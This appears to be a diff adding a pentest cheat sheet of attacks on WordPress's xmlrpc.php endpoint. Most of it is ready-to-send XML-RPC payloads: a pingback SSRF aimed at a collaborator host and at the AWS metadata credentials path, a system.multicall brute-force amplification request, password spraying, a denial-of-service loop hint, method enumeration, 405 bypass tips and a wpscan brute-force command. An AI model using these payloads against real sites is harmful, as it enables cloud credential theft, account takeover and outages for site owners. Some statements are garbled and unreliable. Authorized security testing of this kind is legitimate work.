@@ -1,0 +1,132 @@
+# WordPress xmlrpc.php Attacks
+
+If `/xmlrpc.php` returns `200` with any XML, the site is open to these attacks.
+
+## Quick check
+```
+POST /xmlrpc.php
+
+<methodCall>
+  <methodName>system.listMethods</methodName>
+  <params></params>
+</methodCall>
+
+# Open = response contains "system.multicall", "pingback.ping", "wp.getUsersBlogs"
+```
+
+## 1. Pingback = stored & blind SSRF
+Test the target's ability to fetch a URL (your server / 169.254.169.254 / localhost).
+```
+POST /xmlrpc.php
+Content-Type: text/xml
+
+<?xml version="1.0"?>
+<methodCall>
+  <methodName>pingback.ping</methodName>
+  <params>
+    <param><value><string>http://YOUR-COLLABORATOR.com</string></value></param>
+    <param><value><string>http://target.com/?p=1</string></value></param>
+  </params>
+</methodCall>
+```
+If your server logs a hit → **SSRF** (also works against `169.254.169.254`, DB ports, internal hosts).
+This is *authenticated bypassed* too: any post ID as source works.
+
+Blind SSRF to cloud metadata (AWS):
+```
+<param><value><string>http://169.254.169.254/latest/meta-data/iam/security-credentials/</string></value></param>
+```
+
+## 2. Brute force amplification (system.multicall)
+100–1000 password guesses in ONE request per username. No rate limiting on most installs.
+```
+<?xml version="1.0"?>
+<methodCall>
+  <methodName>system.multicall</methodName>
+  <params>
+    <param><value><array><data>
+      <value><struct>
+        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
+        <member><name>params</name><value><array><data>
+          <value><string>admin</string></value>
+          <value><string>password1</string></value>
+        </data></array></value></member>
+      </struct></value>
+      <value><struct>
+        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
+        <member><name>params</name><value><array><data>
+          <value><string>admin</string></value>
+          <value><string>password2</string></value>
+        </data></array></value></member>
+      </struct></value>
+      <!-- add more blocks, one per password guess -->
+    </data></array></value></param>
+  </params>
+</methodCall>
+```
+
+## 3. Password spray via wp.getUsersBlogs
+```
+<methodCall>
+  <methodName>wp.getUsersBlogs</methodName>
+  <params>
+    <param><value><string>admin</string></value></param>
+    <param><value><string>Winter2026!</string></value></param>
+  </params>
+</methodCall>
+```
+
+## 4. DoS test (legit pentest use: check if it crashes/timeouts)
+```
+<?xml version="1.0"?>
+<methodCall>
+  <methodName>wp.getUsersBlogs</methodName>
+  <params>
+    <param><value><string>admin</string></value></param>
+    <param><value><string>1</string></value></param>
+  </params>
+</methodCall>
+# Force error first to confirm, then:
+# Use multi-request loop (only on authorized targets)
+```
+
+## 5. XML-RPC "Full" enumeration of exposed methods
+```
+system.listMethods
+wp.getUsersBlogs
+wp.getPost
+wp.getPosts
+wp.getComment
+wp.getComments
+wp.getOptions
+wp.editPost
+wp.newPost
+wp.deletePost
+wp.uploadFile
+wp.getMediaItem
+wp.getAuthors
+wp.getTerms
+```
+
+`wp.getAuthors` (if callable) dumps authors even when REST is closed:
+```
+<methodCall>
+  <methodName>wp.getAuthors</methodName>
+  <params>
+    <param><value><int>1</int></value></param>
+    <param><value><string>admin</string></value></param>
+    <param><value><string>REAL_ADMIN_PASSWORD</string></value></param>
+  </params>
+</methodCall>
+```
+(requires valid creds unless the plugin has auth bugs)
+
+## 6. Disable/block check
+If `xmlrpc.php` is present but returns 405/403, it is filtered. Note the response, move on to REST API tests.
+
+---
+
+## Tips
+- If the server responds `405 Method Not Allowed` on POST, but the endpoint proxies — try `X-HTTP-Method-Override: GET`, or the trailing `/xmlrpc.php/` path.
+- Some hosts hide xmlrpc only on `wp-login.php` bots; bypassing is not needed — xmlrpc is the target.
+- Use `wpscan --url target --password-attack xmlrpc` to automate the multicall brute force queries.
